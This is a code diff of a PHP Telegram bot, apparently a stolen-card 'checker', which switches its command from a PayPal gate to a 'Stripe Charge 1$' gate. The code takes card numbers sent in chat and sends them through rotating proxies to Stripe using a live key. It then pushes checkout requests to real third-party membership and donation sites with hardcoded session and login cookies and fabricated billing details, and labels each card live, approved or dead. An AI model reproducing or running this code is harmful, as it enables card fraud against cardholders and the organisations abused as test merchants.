@@ -5,9 +5,9 @@ ini_set('display_errors', 1);
 
 ini_set('log_errors', TRUE);
 ini_set('error_log', 'errors.log');
-
 //=========RANK DETERMINE=========//
-$gate = "𝗣𝗮𝘆𝗽𝗮𝗹 𝟮$ 𝗖𝗵𝗮𝗿𝗴𝗲";
+
+$gate = "𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 𝟭$";
 $currentDate = date('Y-m-d');
     $rank = "FREE";
     $expiryDate = "0";
@@ -65,17 +65,15 @@ $currentDate = date('Y-m-d');
 $update = json_decode(file_get_contents("php://input"), TRUE);
 $text = $update["message"]["text"];
 //========WHO CAN CHECK FUNC========//
-$r = "0";
-$gcm = "/pu";
-$r = rand(0, 100);
+
 //=====WHO CAN CHECK FUNC END======//
-if (preg_match('/^(\/pu|\.pu|!pu)/', $text)) {
+if (preg_match('/^(\/st|\.st|!st)/', $text)) {
     $userid = $update['message']['from']['id'];
 
-  if (!checkAccess($userid)) {
-      $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b> @$username You're not Premium user❌</b>", $message_id);
+    if (!checkAccess($userid)) {
+        $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b> @$username You're not Premium user❌</b>", $message_id);
       exit();
-  }
+    }
 $start_time = microtime(true);
 
   $chatId = $update["message"]["chat"]["id"];
@@ -86,7 +84,7 @@ $start_time = microtime(true);
 
 //====ANTISPAM AND WRONG FORMAT====//
     if (strlen($message) <= 4) {
-            sendMessage($chatId, "<b>• 𝗪𝗿𝗼𝗻𝗴 𝗙𝗼𝗿𝗺𝗮𝘁! ⚠️</b>%0A• 𝘀𝗲𝗻𝗱 <code>/pu cc|mm|yy|cvv</code>%0A• 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 >> $gate", $message_id);
+            sendMessage($chatId, '<b>• Wrong Format! ⚠️</b>%0A• 𝘚𝘦𝘯𝘥 <code>/st cc|mm|yy|cvv</code>%0A• 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 >> <code>Stripe Charge 1</code>', $message_id);
             exit();
   }
 $r = "0";
@@ -119,12 +117,14 @@ $cvv = isset($separa[3]) ? $separa[3] : '';
 $last4 = substr($cc, -4);
 
 
-$sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b>━━━━━━━━━━━━━━━━━━
+$sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b>
+
 [↯] 𝗖𝗖 ★ <code>$lista</code>
-[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ ℂ𝕙𝕖𝕔𝕜𝕚𝕟𝕘 2𝟘%
-[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ★  $gate
+[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ ■□□□□ 20%🔵
+[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ★  2001 Insufficient Funds?
 ━━━━━━━━━━━━━━━━━━
-[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username/<code>[$rank]</code>
+[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 @$username/<code>[$rank]</code>
+
 ━━━━━━━━━━━━━━━━━━</b>");
 
 function value($str,$find_start,$find_end)
@@ -198,13 +198,15 @@ $pass = passwordGen();
 
 
 sleep(1);
-    edit_sent_message($chatId, $sent_message_id, "<b>━━━━━━━━━━━━━━━━━━
-[↯] 𝗖𝗖 ★ <code>$lista</code>
-[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ ℂ𝕙𝕖𝕔𝕜𝕚𝕟𝕘 4𝟘%
-[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ★ $gate
-━━━━━━━━━
-[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username/<code>[$rank]</code>
+    edit_sent_message($chatId, $sent_message_id, "<b>
 
+[↯] 𝗖𝗖 ★ <code>$lista</code>
+[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ ■■□□□ 40%🔵
+[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ★ 696969: Duplicate card exists?
+━━━━━━━━━
+[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 @$username/<code>[$rank]</code>
+
+━━━━━━━━━━━━━━━━━</b>
 ━━━━━━━━━━━━━━━━━━</b>");
 
   //==================[Randomizing Details]======================//
@@ -286,12 +288,13 @@ if($state=="Alabama"){ $state="AL";
 
 //==============[Randomizing Details-END]======================//
 sleep(1);
-    edit_sent_message($chatId, $sent_message_id, "<b>━━━━━━━━━━━━━━━━━━
+    edit_sent_message($chatId, $sent_message_id, "<b>
+
 [↯] 𝗖𝗖 ★ <code>$lista</code>
-[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ ℂ𝕙𝕖𝕔𝕜𝕚𝕟𝕘 6𝟘%
-[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ★ $gate
+[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ ■■■□□ 60%🔵
+[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ★ 2044: Declined - Call Issuer?
 ━━━━━━━━━━━━━━━━━━
-[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username/<code>[$rank]</code>
+[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 @$username/<code>[$rank]</code>
 
 ━━━━━━━━━━━━━━━━━━</b>");
 
@@ -346,18 +349,16 @@ $type =strtoupper(GetStr($fim, '"type":"', '"'));
 
 
 sleep(1);
-    edit_sent_message($chatId, $sent_message_id, "<b>━━━━━━━━━━━━━━━━━━
-[↯] 𝗖𝗖 ★ <code>$lista</code>
-[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ ℂ𝕙𝕖𝕔𝕜𝕚𝕟𝕘 8𝟘%
-[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ★ $gate
-━━━━━━━━━━━━━━━━━━
-[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username/<code>[$rank]</code> 
-━━━━━━━━━━━━━━━━━━</b>");
-//=======================[1 REQ]==================================//
-$x = 0;
-while(true)
-{
+    edit_sent_message($chatId, $sent_message_id, "<b>
 
+[↯] 𝗖𝗖 ★ <code>$lista</code>
+[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ ■■■■□ 80%🔵
+[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ★ cvv: Gateway Rejected: cvv?
+━━━━━━━━━━━━━━━━━━
+[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 @$username/<code>[$rank]</code>
+
+━━━━━━━━━━━━━━━━━━</b>");
+//=======================[5 REQ]==================================//
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, $socks5);
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
@@ -367,24 +368,24 @@ curl_setopt($ch, CURLOPT_POST, 1);
 $headers = array();
 $headers[] = 'Host: api.stripe.com';
 $headers[] = 'Accept: application/json';
-$headers[] = 'Accept-Language: en-US,en;q=0.8';
+$headers[] = 'Accept-Language: en-US,en;q=0.5';
 $headers[] = 'Content-Type: application/x-www-form-urlencoded';
 $headers[] = 'Path: /v1/payment_methods';
 $headers[] = 'Origin: https://js.stripe.com';
 $headers[] = 'Referer: https://js.stripe.com/';
-$headers[] = 'sec-ch-ua: "Not/A)Brand";v="99", "Microsoft Edge";v="115", "Chromium";v="115"';
+$headers[] = 'sec-ch-ua: "Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"';
 $headers[] = 'sec-ch-ua-mobile: ?0';
 $headers[] = 'sec-ch-ua-platform: "Windows"';
 $headers[] = 'Sec-Fetch-Dest: empty';
 $headers[] = 'Sec-Fetch-Mode: cors';
 $headers[] = 'Sec-Fetch-Site: same-site';
-$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188';
+$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36';
 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=e6de2d6e-b274-4446-bf7c-2ddc40b41aea5641ba&muid=5b822e84-caae-41de-8a32-c54d05c25b9e3ef89a&sid=69a97df0-8b95-4902-9eab-80f20f1758e24e759d&pasted_fields=number&payment_user_agent=stripe.js%2F7e8ee2cfca%3B+stripe-js-v3%2F7e8ee2cfca%3B+split-card-element&referrer=https%3A%2F%2Fwww.yasminmogahedtv.com&time_on_page=79353&key=pk_live_51HdbmyHNc8MTJAaGytBzUdQLnsyVtugsmpGoxyN6NwE9ip5CsvYgmwAgxB5JBcyGnORmoxbtZzdvMl4AN6TwejOX00t0lGfzmO');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][line1]=4821+Ridge+Top+Cir&billing_details[address][line2]=&billing_details[address][city]=Anchorage&billing_details[address][state]=AK&billing_details[address][postal_code]=99508&billing_details[address][country]=US&billing_details[name]=Min+Thant&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=50c29e79-70fb-4db0-806e-601807510536383382&sid=7f037b8b-f7d4-4dbe-8e7a-7c940bf17590aca2af&pasted_fields=number&payment_user_agent=stripe.js%2F3e325ca450%3B+stripe-js-v3%2F3e325ca450%3B+split-card-element&referrer=https%3A%2F%2Ffriendsoflakeclaremont.org&time_on_page=57419&key=pk_live_qVbUTbBD3NFaB0QThLooisJK00we1Bhu4o');
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
@@ -393,26 +394,12 @@ $brandi = trim(strip_tags(getStr($result1,'"brand": "','"')));
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
-if (strpos($result1,"rate_limit"))
-{
-    $x++;
-    continue;
-}
-
-break;
-}
 //==================req 1 end===============//
 //==================req 2===============//
-
-$x = 0;
- while (true) 
- {
-  
- 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, $socks5);
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://www.yasminmogahedtv.com/membership-account/membership-checkout/');
+curl_setopt($ch, CURLOPT_URL, 'https://friendsoflakeclaremont.org/?page_id=4562&level=1');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -425,21 +412,21 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
             curl_setopt($ch, CURLOPT_POST, 1);
 $headers = array(
-  'authority: www.yasminmogahedtv.com',
+  'authority: friendsoflakeclaremont.org',
   'method: POST',
-  'path: /membership-account/membership-checkout/ HTTP/1.1',
+  'path: /?page_id=4562&level=1',
   'scheme: https',
-  'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-  'accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
-  'cnntent-Type: application/x-www-form-urlencoded',
-  'cookie: PHPSESSID=qcpqv2lku3sqateclj8lh93bb0; pmpro_visit=1; __stripe_mid=5b822e84-caae-41de-8a32-c54d05c25b9e3ef89a; __stripe_sid=69a97df0-8b95-4902-9eab-80f20f1758e24e759d',
-  'origin: https://www.yasminmogahedtv.com',
-  'referer: https://www.yasminmogahedtv.com/membership-account/membership-checkout/',
-  'sec-Fetch-Dest: document',
-  'sec-Fetch-Mode: navigate',
-  'sec-Fetch-Site: same-origin',
-  'user-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-  );
+  'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+  'accept-language: en-US,en;q=0.5',
+  'content-type: application/x-www-form-urlencoded',
+  'cookie: pmpro_visit=1; PHPSESSID=a9ff1fdf021e1418517e0ab1bba02a56; __stripe_mid=50c29e79-70fb-4db0-806e-601807510536383382; __stripe_sid=7f037b8b-f7d4-4dbe-8e7a-7c940bf17590aca2af; wordpress_logged_in_ed491f5bdb1beac3480bec0690cd8f88=bullet3%7C1699018091%7CwnNvTmOCOI2Ebou1zDmKw14GNcALBGc9RCtA2SWxEvL%7C7ad883e90f12dbb2987899118f93911cd5869e2f3c9c9bf0e674c4c23a0e7fdd; wfwaf-authcookie-24ac4681fd54ee5515bf6721694a0af3=45125%7Csubscriber%7Cread%7Cf2fedea412c5ae9a227f53d6a973a047136805e95e06714f29555ddd0263c3dc',
+  'origin: https://friendsoflakeclaremont.org',
+  'referer: https://friendsoflakeclaremont.org/?page_id=4562&level=1',
+  'sec-fetch-dest: document',
+  'sec-fetch-mode: navigate',
+  'sec-fetch-site: same-origin',
+  'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
+     );
 
 
 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
@@ -447,7 +434,7 @@ curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'level=4&checkjavascript=1&other_discount_code=&username=Dexter&password=Dexter834&password2=Dexter834&bemail='.$email.'&bconfirmemail='.$email.'&fullname=&telephone=%2B95+977555859&CardType='.$brandi.'&discount_code=&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX'.$last4.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'level=1&checkjavascript=1&bfirstname='.$firstname.'&blastname='.$lastname.'&baddress1=4821+Ridge+Top+Cir&baddress2=&bcity=Anchorage&bstate=AK&bzipcode=99508&bcountry=US&bphone=%28831%29+756-8311&bemail='.$email.'&bconfirmemail=Daemon99%40gmail.com&CardType='.$brandi.'&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX'.$last4.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');
 
 
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
@@ -456,28 +443,20 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 $result2 = curl_exec($ch);
 $msg = trim(strip_tags(getStr($result2,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));
 
-if (strpos($result2,"rate_limit"))
-{
-    $x++;
-    continue;
-}
-
-break;
- }
-
 //==================req 2 end===============//
 
 
 
 sleep(1);
-    edit_sent_message($chatId, $sent_message_id, "<b>━━━━━━━━━━━━━━━━━━
+    edit_sent_message($chatId, $sent_message_id, "<b>
+
 [↯] 𝗖𝗖 ★ <code>$lista</code>
-[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ ■■■■■ 99%
-[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ★ CCN : Incorrect cvv?🟣
+[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ ■■■■■ 99%🔵
+[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ★ cvv: Gateway Rejected: cvv?
 ━━━━━━━━━━━━━━━━━━
-[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username/<code>[$rank]</code>
-[↯] 𝗕𝗢𝗧 𝗕𝗬 ↯ @BlackHeadsOP 
-━━━━━━━━━━━━━━━━━━</b>");
+[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 @$username/<code>[$rank]</code>
+</b>
+━━━━━━━━━━━━━━━━━━</b>", $message_id);
 $end_time = microtime(true);
 $time = number_format($end_time - $start_time, 2);
 
@@ -494,21 +473,22 @@ if (
     strpos($result2, '"type":"one-time"') !== false ||
     strpos($result2, "/donations/thank_you?donation_number=") !== false
 ) {
-  $resp = "<b>𝙋𝙖𝙮𝙋𝙖𝙡 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅
+  $resp = "<b>
+𝙎𝙏𝙍𝙄𝙋𝙀 𝘾𝙃𝘼𝙍𝙂𝙀 1$
 ━━━━━━━━━━━━━━━━━━
 [↯] 𝗖𝗖 ★ <code>$lista</code>
-[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ Approved 🟢
-[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code>Thanks for your donation!. </code>
+[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ CHANGE 🟢
+[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code> Thanks for your donation </code>
 ━━━━━━━━━━━━━━━━━━
-[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ↯<code>$bank</code>
-[↯] 𝗕𝗮𝗻𝗸 ↯ <code>$brand</code>
-[↯] 𝗧𝗬𝗣𝗘 ↯ <code>$type</code>
-[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ <code>$name $emoji</code>
+[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 <code>$bank</code>
+[↯] 𝗕𝗮𝗻𝗸 <code>$brand</code>
+[↯] 𝗧𝗬𝗣𝗘 <code>$type</code>
+[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 <code>$name $emoji</code>
 ━━━━━━━━━━━━━━━━━━
-[↯] 𝗣𝗥𝗢𝗫𝗬 ↯<code>$r.XXX.XXX.XX Live ✅</code>
-[↯] 𝗧𝗜𝗠𝗘 ↯ <code>$time seconds</code> 
-[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username <code>[$rank]</code>
-━━━━━━━━━━━━━━━━━━
+[↯] 𝗣𝗥𝗢𝗫𝗬 <code>$r.XXX.XXX.XX Live ✅</code>
+[↯] 𝗧𝗜𝗠𝗘 <code>$time seconds</code> 
+[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 @$username <code>[$rank]</code>
+
 
 </b>";
 sleep(1);
@@ -526,21 +506,22 @@ elseif (
     strpos($result2, '"status":"success"') !== false ||
     strpos($result2, "stripe_3ds2_fingerprint") !== false
 ) {
-$resp = "<b>𝙋𝙖𝙮𝙋𝙖𝙡 𝗟𝗜𝗩𝗘  ✅
+$resp = "<b>
+𝙎𝙏𝙍𝙄𝙋𝙀 𝘾𝙃𝘼𝙍𝙂𝙀 1$ ✅
 ━━━━━━━━━━━━━━━━━━
 [↯] 𝗖𝗖 ★ <code>$lista</code>
-[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ Live 🟢
-[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code> CVV 2$ ✅</code>
+[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ LIVE 🟢
+[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code>CCN CHANGE 2$ </code>
 ━━━━━━━━━━━━━━━━━━
-[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ↯<code>$bank</code>
-[↯] 𝗕𝗮𝗻𝗸 ↯ <code>$brand</code>
-[↯] 𝗧𝗬𝗣𝗘 ↯ <code>$type</code>
-[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ <code>$name $emoji</code>
+[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 <code>$bank</code>
+[↯] 𝗕𝗮𝗻𝗸 <code>$brand</code>
+[↯] 𝗧𝗬𝗣𝗘 <code>$type</code>
+[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 <code>$name $emoji</code>
 ━━━━━━━━━━━━━━━━━━
-[↯] 𝗣𝗥𝗢𝗫𝗬 ↯ <code>$r.XXX.XXX.XX Live ✅</code>
-[↯] 𝗧𝗜𝗠𝗘 ↯ <code>$time seconds</code> 
-[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username <code>[$rank]</code>
-━━━━━━━━━━━━━━━━━━
+[↯] 𝗣𝗥𝗢𝗫𝗬 <code>$r.XXX.XXX.XX Live ✅</code>
+[↯] 𝗧𝗜𝗠𝗘 <code>$time seconds</code> 
+[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 @$username <code>[$rank]</code>
+
 
 </b>";
 
@@ -554,21 +535,22 @@ elseif (
     strpos($result2, 'security code is invalid.') !== false ||
     strpos($result2, "incorrect_cvc") !== false
 ) {
-$resp = "<b>𝙋𝙖𝙮𝙋𝙖𝙡 𝗟𝗜𝗩𝗘  ✅
+$resp = "<b>
+𝙎𝙏𝙍𝙄𝙋𝙀 𝘾𝙃𝘼𝙍𝙂𝙀 1$ ✅
 ━━━━━━━━━━━━━━━━━━
 [↯] 𝗖𝗖 ★ <code>$lista</code>
-[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ Live 🟡
-[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code> CCN 2$ ❎</code>
+[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ Live 🟢
+[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code> CCN CHANGE 1$ ✅ </code>
 ━━━━━━━━━━━━━━━━━━
-[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ↯<code>$bank</code>
-[↯] 𝗕𝗮𝗻𝗸 ↯ <code>$brand</code>
-[↯] 𝗧𝗬𝗣𝗘 ↯ <code>$type</code>
-[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ <code>$name $emoji</code>
+[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 <code>$bank</code>
+[↯] 𝗕𝗮𝗻𝗸 <code>$brand</code>
+[↯] 𝗧𝗬𝗣𝗘 <code>$type</code>
+[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 <code>$name $emoji</code>
 ━━━━━━━━━━━━━━━━━━
-[↯] 𝗣𝗥𝗢𝗫𝗬 ↯ <code>$r.XXX.XXX.XX Live ✅</code>
-[↯] 𝗧𝗜𝗠𝗘 ↯ <code>$time seconds</code> 
-[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username <code>[$rank]</code>
-━━━━━━━━━━━━━━━━━━
+[↯] 𝗣𝗥𝗢𝗫𝗬 <code>$r.XXX.XXX.XX Live ✅</code>
+[↯] 𝗧𝗜𝗠𝗘 <code>$time seconds</code> 
+[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 @$username <code>[$rank]</code>
+
 
 </b>";
 
@@ -578,21 +560,22 @@ edit_sent_message($chatId, $sent_message_id, $resp);
 
 
 elseif(strpos($result2, "Error updating default payment method. Your card was declined.")) {
-$resp = "<b>𝙋𝙖𝙮𝙋𝙖𝙡 𝗟𝗜𝗩𝗘 ❌
+$resp = "<b>
+𝙎𝙏𝙍𝙄𝙋𝙀 𝘾𝙃𝘼𝙍𝙂𝙀 1$ ❌
 ━━━━━━━━━━━━━━━━━━
 [↯] 𝗖𝗖 ★ <code>$lista</code>
 [↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ Dead 🔴
 [↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code>$msg </code>
 ━━━━━━━━━━━━━━━━━━
-[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ↯<code>$bank</code>
-[↯] 𝗕𝗮𝗻𝗸 ↯ <code>$brand</code>
-[↯] 𝗧𝗬𝗣𝗘 ↯ <code>$type</code>
-[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ <code>$name $emoji</code>
+[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 <code>$bank</code>
+[↯] 𝗕𝗮𝗻𝗸 <code>$brand</code>
+[↯] 𝗧𝗬𝗣𝗘 <code>$type</code>
+[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 <code>$name $emoji</code>
 ━━━━━━━━━━━━━━━━━━
-[↯] 𝗣𝗥𝗢𝗫𝗬 ↯ <code>$r.XXX.XXX.XX Live ✅</code>
-[↯] 𝗧𝗜𝗠𝗘 ↯ <code>$time seconds</code> 
-[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username <code>[$rank]</code>
-━━━━━━━━━━━━━━━━━━
+[↯] 𝗣𝗥𝗢𝗫𝗬 <code>$r.XXX.XXX.XX Live ✅</code>
+[↯] 𝗧𝗜𝗠𝗘 <code>$time seconds</code> 
+[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 @$username <code>[$rank]</code>
+
 
   </b>";
 
@@ -601,21 +584,21 @@ edit_sent_message($chatId, $sent_message_id, $resp);
 }
 
 elseif(strpos($result2, "Unknown error generating account. Please contact us to set up your membership.")) {
-$resp = "<b>𝙋𝙖𝙮𝙋𝙖𝙡 𝗟𝗜𝗩𝗘 ❌  🌩
+$resp = "<b>
+𝙎𝙏𝙍𝙄𝙋𝙀 𝘾𝙃𝘼𝙍𝙂𝙀 1$
 ━━━━━━━━━━━━━
-[↯] 𝗖𝗖 ★ <code>$lista</code>
-[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ Dead 🔴
-[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code>404 Error</code>
+[M] 𝗖𝗖 ★ <code>$lista</code>
+[M] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ Dead 🔴
+[M] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code>404 Error</code>
 ━━━━━━━━━━━━━━━━━━
-[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ↯ <code>$bank</code>
-[↯] 𝗕𝗮𝗻𝗸 ↯ <code>$brand</code>
-[↯] 𝗧𝗬𝗣𝗘 ↯ <code>$type</code>
-[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ <code>$name $emoji</code>
+[M] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 <code>$bank</code>
+[M] 𝗕𝗮𝗻𝗸 <code>$brand</code>
+[M] 𝗧𝗬𝗣𝗘 <code>$type</code>
+[M] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 <code>$name $emoji</code>
 ━━━━━━━━━━━━━━━━━━
-[↯] 𝗣𝗥𝗢𝗫𝗬 ↯ <code>$r.XXX.XXX.XX Live ✅</code>
-[↯] 𝗧𝗜𝗠𝗘 ↯ <code>$time seconds</code> 
-[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username <code>[$rank]</code>
-━━━━━━━━━━━━━━━━━━
+[M] 𝗣𝗥𝗢𝗫𝗬 <code>$r.XXX.XXX.XX Live ✅</code>
+[M] 𝗧𝗜𝗠𝗘 <code>$time seconds</code> 
+[M] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 @$username <code>[$rank]</code>
 
 
 </b>";
@@ -625,21 +608,22 @@ edit_sent_message($chatId, $sent_message_id, $resp);
 }
 
 else {
-$resp = "<b>𝙋𝙖𝙮𝙋𝙖𝙡 𝗟𝗜𝗩𝗘 ❌
+$resp = "<b>
+𝙎𝙏𝙍𝙄𝙋𝙀 𝘾𝙃𝘼𝙍𝙂𝙀 1$ ❌
 ━━━━━━━━━━━━━━━━━━
 [↯] 𝗖𝗖 ★ <code>$lista</code>
 [↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ Dead 🔴
 [↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code>$msg </code>
 ━━━━━━━━━━━━━━━━━━
-[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ↯<code>$bank</code>
-[↯] 𝗕𝗮𝗻𝗸 ↯ <code>$brand</code>
-[↯] 𝗧𝗬𝗣𝗘 ↯ <code>$type</code>
-[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ <code>$name $emoji</code>
+[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 <code>$bank</code>
